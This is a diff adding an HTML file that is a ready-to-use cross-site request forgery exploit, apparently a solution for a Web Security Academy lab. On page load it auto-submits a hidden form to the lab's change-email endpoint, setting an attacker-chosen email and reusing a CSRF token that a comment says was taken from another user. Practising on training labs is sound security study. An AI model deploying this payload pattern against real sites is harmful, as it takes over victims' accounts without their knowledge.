@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form method="POST" action="https://0a4d0064047d1bc081b8863c000a0026.web-security-academy.net/my-account/change-email">
+        <input type="hidden" name="email" value="istoleyour@gmail.com">
+        <!-- Using valid  csrf from other user ~^ ^~ -->
+        <input type="hidden" name="csrf" value="cbhcKQz9fZFUdWHgGE5DHbqta4Y3opjm">
+    </form>
+
+    <script>
+        document.forms[0].submit()
+    </script>
+
+</body>
+</html>
